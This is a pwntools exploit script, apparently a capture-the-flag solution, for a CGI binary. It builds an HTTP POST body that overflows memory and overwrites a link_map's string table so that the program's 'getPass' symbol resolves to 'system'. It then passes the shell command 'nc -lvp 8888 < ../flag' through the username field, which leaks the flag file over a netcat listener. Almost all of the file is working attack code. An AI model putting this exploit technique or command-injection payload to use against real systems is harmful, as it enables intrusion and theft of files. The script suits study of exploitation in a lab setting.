#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

context.log_level = "info"

overflow_start_addr = 0x7FBFD7002000 + 0x14300
link_map_0x68 = 0x7FBFD713C248
ptr_arr_addr = 0x7FBFD7002000 + 0x40C0
real_strtab_addr = 0x7FBFD701AEA0

# set least 3 byte to 0
strtab_pad = link_map_0x68 - overflow_start_addr + 2

fake_strtab = "%00__gmon_start__%00_ITM_deregisterTMCloneTable%00_ITM_registerTMCloneTable%00__cxa_finalize%00checkLogin%00genCookie%00getPass%00strcmp%00printf%00libctfc.so%00libc.so.6%00GLIBC_2.2.5%00%00"
fake_strtab = fake_strtab.replace(
    "%00getPass%00", "%00system%00".ljust(len("%00getPass%00"), "a")
)


def cons_ptr_arr():
    least_2_bytes = real_strtab_addr & 0xFFFF
    re = ""
    offset = ptr_arr_addr
    for i in range(0x2000):
        if (offset - 8) & 0xFFFF == least_2_bytes:
            re += fake_strtab
            break
        else:
            re += "a=b"
        offset += 8
        re += "&"
    return re


def get_payload(data):
    payload = b"POST /cgi-bin/main.cgi HTTP/1.1\r\n"
    payload += b"Host: localhost\r\n"
    payload += b"Content-Type: application/x-www-form-urlencoded\r\n"
    payload += b"Connection: close\r\n"

    # 构建POST数据
    # post_data = b"username=" + name + b"&passwd=" + passwd + b"&test=abcd"  # + b"&"
    post_data = data
    payload += f"Content-Length: {len(post_data)}\r\n".encode()
    payload += b"\r\n"
    payload += post_data
    payload += b"\r\n"
    return payload


data = cons_ptr_arr().encode()
cmd = "nc -lvp 8888 < ../flag"
data += f"&username={cmd}&passwd={'a'*strtab_pad}&a=b".encode()
payload = get_payload(data)
s(payload)

res = r()
print(res)
if b"500 Internal Server Error" in res:
    exit()
ia()

# dest_buf = 0x7ffff7e95100
# list = 0x7ffff7e850c0
